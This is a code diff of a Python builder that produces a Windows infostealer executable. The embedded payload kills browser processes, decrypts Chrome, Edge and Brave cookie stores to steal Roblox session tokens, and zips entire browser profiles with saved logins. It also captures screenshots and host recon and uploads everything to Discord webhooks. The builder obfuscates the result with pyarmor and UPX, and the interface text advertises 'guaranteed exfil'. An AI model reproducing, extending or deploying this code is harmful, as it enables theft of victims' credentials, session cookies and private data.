@@ -530,7 +530,7 @@ def get_webhook():
             generate_malware(webhooks, pfx_path, pfx_pass, mode)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe built - full raw profile dump fallback + screenshots.\nABE kills decryption? You still get encrypted DBs + visuals.")
+            messagebox.showinfo("Built", "stealer.exe rebuilt - crash-proof dumps + guaranteed exfil.\nAlways sends recon + screen even if everything else dies.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
@@ -544,14 +544,13 @@ def get_webhook():
     info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
     info_text.pack(padx=10, pady=10)
     info_text.insert(tk.END, textwrap.dedent('''
-    ROBLOX + FULL BROWSER STEALER - DEC 2025 ABE-PROOF
-    • Old decryption attempt (legacy blobs/Opera)
-    • Full fallback: zips entire profiles (Default + Profile 1-9)
-    • Screenshots of Local State/Login Data/Cookies folders
-    • Separate Roblox .ROBLOSECURITY hunt
-    • Raw encrypted DBs = offline decrypt later or sell raw
-    • UPX ultra-brute + massive hidden imports
-    Mode 0 free owns forever.
+    ROBLOX + FULL BROWSER STEALER - DEC 2025 CRASH-PROOF
+    • Always sends recon.txt + desktop screenshot
+    • Robust profile zip dump (skips errors, no crash)
+    • Roblox cookie hunt
+    • Raw encrypted DBs when ABE owns decryption
+    • Bulletproof requests bundling
+    Mode 0 still free and lethal.
     '''))
     info_text.config(state=tk.DISABLED)
 
@@ -580,8 +579,8 @@ import json
 import base64
 import shutil
 import zipfile
-from Crypto.Cipher import AES
 import win32crypt
+from Crypto.Cipher import AES
 
 def is_admin():
     try:
@@ -596,26 +595,19 @@ BROWSER_BASE = {
     "Chrome": os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data"),
     "Edge": os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data"),
     "Brave": os.path.join(os.getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-    "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
 }
 
-def safe_copy(src, dst, retries=15, delay=2):
+def kill_browsers():
     for proc in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe"]:
         subprocess.call(f'taskkill /f /im {proc} >nul 2>&1', shell=True)
-    for _ in range(retries):
-        try:
-            shutil.copytree(src, dst, dirs_exist_ok=True) if os.path.isdir(src) else shutil.copyfile(src, dst)
-            return True
-        except:
-            time.sleep(delay)
-    return False
+    time.sleep(2)
 
-def is_vm(): return "No"
 def get_public_ip():
-    for url in ["https://api.ipify.org", "https://ifconfig.me"]:
+    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
         try: return requests.get(url, timeout=5).text.strip()
         except: pass
     return "Failed"
+
 def get_local_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -624,54 +616,47 @@ def get_local_ip():
         s.close()
         return ip
     except: return "Failed"
+
 def get_hwid():
     try: return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
     except: return str(uuid.getnode())
 
-def get_master_key(local_state):
-    if not os.path.exists(local_state): return None
-    try:
-        with open(local_state, "r", encoding="utf-8") as f:
-            ls = json.loads(f.read())
-        enc_key_b64 = ls["os_crypt"].get("encrypted_key") or ls["os_crypt"].get("app_bound_encrypted_key")
-        if not enc_key_b64: return None
-        enc_key = base64.b64decode(enc_key_b64)
-        enc_key = enc_key[5:] if enc_key.startswith(b"DPAPI") or enc_key.startswith(b"APPB") else enc_key
-        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
-    except: return None
-
-def decrypt_gcm(encrypted_val, master_key):
-    try:
-        nonce = encrypted_val[3:15]
-        ciphertext = encrypted_val[15:-16]
-        tag = encrypted_val[-16:]
-        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-        pt = cipher.decrypt(ciphertext)
-        cipher.verify(tag)
-        return pt.decode('utf-8', errors='ignore')
-    except: return "DECRYPT_FAIL"
-
 def grab_roblox_cookie(profile_path):
     cookies_db = os.path.join(profile_path, "Network", "Cookies")
     if not os.path.exists(cookies_db): return ""
-    temp_db = os.path.join(os.getenv("TEMP"), f"roblox_cookies_{random.randint(10000,99999)}.db")
-    if not safe_copy(cookies_db, temp_db): return ""
-    roblox = ""
-    master_key = get_master_key(os.path.join(os.path.dirname(profile_path), "Local State"))
+    temp_db = os.path.join(os.getenv("TEMP"), f"tmp_cookies_{random.randint(10000,99999)}.db")
     try:
+        shutil.copyfile(cookies_db, temp_db)
+        master_key_path = os.path.join(os.path.dirname(profile_path), "Local State")
+        master_key = None
+        if os.path.exists(master_key_path):
+            try:
+                with open(master_key_path, "r", encoding="utf-8") as f:
+                    ls = json.loads(f.read())
+                enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
+                master_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
+            except: pass
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
-        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com'")
+        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com'")
+        roblox = ""
         for host, name, enc_val in cursor.fetchall():
             if name == ".ROBLOSECURITY" and enc_val:
-                val = decrypt_gcm(enc_val, master_key) if master_key else "FAIL"
-                if "FAIL" not in val: roblox = val
+                try:
+                    nonce, ct, tag = enc_val[3:15], enc_val[15:-16], enc_val[-16:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                    pt = cipher.decrypt(ct)
+                    cipher.verify(tag)
+                    roblox = pt.decode()
+                except: pass
         conn.close()
-    except: pass
-    finally: os.remove(temp_db) if os.path.exists(temp_db) else None
-    return roblox
+        return roblox
+    except: return ""
+    finally:
+        if os.path.exists(temp_db): os.remove(temp_db)
 
-def dump_profile(browser_name, base_path):
+def safe_dump_profile(browser_name, base_path):
+    kill_browsers()
     profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(base_path, f"Profile {i}"))]
     dumped = []
     for prof in profiles:
@@ -683,79 +668,86 @@ def dump_profile(browser_name, base_path):
                 for root, _, files in os.walk(src):
                     for file in files:
                         fp = os.path.join(root, file)
-                        arc = os.path.relpath(fp, base_path)
-                        z.write(fp, arc)
+                        try:
+                            arc = os.path.relpath(fp, base_path)
+                            z.write(fp, arc)
+                        except: continue  # skip locked/unreadable
             dumped.append(zip_path)
             if HAS_PYAUTO:
-                for kf in ["Local State", "Login Data", os.path.join("Network", "Cookies")]:
+                for kf in ["Local State", "Login Data", "Network\\Cookies"]:
                     kp = os.path.join(src, kf)
                     if os.path.exists(kp):
-                        shot = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof}_{kf.replace(os.sep, '_')}_shot.png")
-                        pyautogui.screenshot(shot)
+                        shot = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof}_{kf.replace('\\\\', '_')}_shot.png")
+                        try: pyautogui.screenshot(shot)
                         dumped.append(shot)
-        except: pass
+                        except: pass
+        except: pass  # full zip fail? skip, don't die
     return dumped
 
 def exfil(webhooks):
-    time.sleep(random.uniform(10, 30))
-    recon = f"RECON {datetime.utcnow()}\\nUser: {os.getenv('USERNAME')}@{platform.node()}\\nOS: {platform.version()}\\nHWID: {get_hwid()}\\nVM: {is_vm()}\\nPub IP: {get_public_ip()}\\nLoc IP: {get_local_ip()}\\n"
+    time.sleep(random.uniform(10, 25))
+    temp_dir = os.getenv("TEMP")
     files_to_send = {}
-    temp_files = []
-    recon_path = os.path.join(os.getenv("TEMP"), "recon.txt")
-    open(recon_path, "w").write(recon)
+    cleanup = []
+
+    # Guaranteed minimum hit
+    recon = f"**RECON {datetime.utcnow()}**\\nUser: {os.getenv('USERNAME')}@{platform.node()}\\nOS: {platform.system()} {platform.release()}\\nHWID: {get_hwid()}\\nPub IP: {get_public_ip()}\\nLoc IP: {get_local_ip()}\\n"
+    recon_path = os.path.join(temp_dir, "recon.txt")
+    open(recon_path, "w", encoding="utf-8").write(recon)
     files_to_send["recon.txt"] = open(recon_path, "rb")
-    temp_files.append(recon_path)
+    cleanup.append(recon_path)
 
     if HAS_PYAUTO:
         try:
-            screen = os.path.join(os.getenv("TEMP"), "desktop.png")
-            pyautogui.screenshot(screen)
-            files_to_send["desktop.png"] = open(screen, "rb")
-            temp_files.append(screen)
+            desk = os.path.join(temp_dir, "desktop.png")
+            pyautogui.screenshot(desk)
+            files_to_send["desktop.png"] = open(desk, "rb")
+            cleanup.append(desk)
         except: pass
 
-    roblox_cookies = []
-    dumped_files = []
-    decryption_worked = False
+    roblox_hits = []
+    all_dumped = []
     for name, base in BROWSER_BASE.items():
         if os.path.exists(base):
-            # Try partial decrypt (passwords/cookies) - omitted for brevity, add if you want
-            rbc = ""
             for prof in ["Default"] + [f"Profile {i}" for i in range(1,5)]:
                 pp = os.path.join(base, prof)
-                if os.path.exists(pp): rbc = grab_roblox_cookie(pp)
-                if rbc: roblox_cookies.append(f"{name} {prof}: {rbc}")
-            # Always dump raw on failure or always (safe)
-            dumped = dump_profile(name, base)
-            dumped_files += dumped
+                if os.path.exists(pp):
+                    rc = grab_roblox_cookie(pp)
+                    if rc: roblox_hits.append(f"{name} {prof}: {rc}")
+            dumped = safe_dump_profile(name, base)
+            all_dumped += dumped
 
-    if roblox_cookies:
-        rb_path = os.path.join(os.getenv("TEMP"), "roblox_cookie.txt")
-        open(rb_path, "w").write("\\n".join(roblox_cookies))
-        files_to_send["roblox_cookie.txt"] = open(rb_path, "rb")
-        temp_files.append(rb_path)
+    if roblox_hits:
+        rb_path = os.path.join(temp_dir, "roblox_cookies.txt")
+        open(rb_path, "w", encoding="utf-8").write("\\n".join(roblox_hits))
+        files_to_send["roblox_cookies.txt"] = open(rb_path, "rb")
+        cleanup.append(rb_path)
 
-    for df in dumped_files:
-        files_to_send[os.path.basename(df)] = open(df, "rb")
-        temp_files.append(df)
+    for d in all_dumped:
+        if os.path.getsize(d) < 20*1024*1024:  # skip huge to avoid Discord block
+            files_to_send[os.path.basename(d)] = open(d, "rb")
+            cleanup.append(d)
 
+    success = False
     for hook in webhooks:
         try:
-            resp = requests.post(hook, data={"content": "**HIT - RAW PROFILES DUMPED**"}, files=files_to_send, timeout=120)
-            if resp.status_code in (200, 204): break
-        except: continue
+            resp = requests.post(hook, data={"content": "**HIT - RECON + DUMPS**"}, files=files_to_send, timeout=90)
+            if resp.status_code in (200, 204):
+                success = True
+                break
+        except: pass
 
+    # Cleanup
     for f in files_to_send.values():
         try: f.close()
         except: pass
-    for p in temp_files:
+    for p in cleanup:
         try: os.remove(p)
         except: pass
 
 exfil({WEBHOOK_PLACEHOLDER})
 ''')
 
-# =================== BUILD FUNCTION ===================
 def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     if not shutil.which("pyarmor"): raise Exception("pyarmor missing → pip install pyarmor")
     if not shutil.which("pyinstaller"): raise Exception("pyinstaller missing → pip install pyinstaller")
@@ -778,7 +770,7 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
         "requests", "requests.auth", "requests.cookies", "requests.packages", "requests.packages.urllib3", "requests.packages.chardet",
         "urllib3", "chardet", "certifi", "idna", "pyautogui", "win32crypt", "pywin32", "win32api", "win32con",
         "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES", "Crypto.Util.Padding", "sqlite3", "json", "base64", "shutil",
-        "ctypes", "platform", "uuid", "winreg", "pyarmor_runtime", "zipfile"
+        "ctypes", "platform", "uuid", "winreg", "pyarmor_runtime", "zipfile", "ssl", "_ssl"
     ]
     hidden_args = [item for mod in hidden for item in ["--hidden-import", mod]]
 
@@ -800,11 +792,11 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
 
     try:
         subprocess.run(["upx", "--best", "--ultra-brute", final_exe], check=False)
-        print("UPX ultra-brute smashed")
+        print("UPX crushed it")
     except: print("UPX skipped")
 
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Built ABE-proof beast: {final_exe}")
+    print(f"Rebuilt crash-proof: {final_exe}")
 
 if __name__ == "__main__":
     get_webhook()
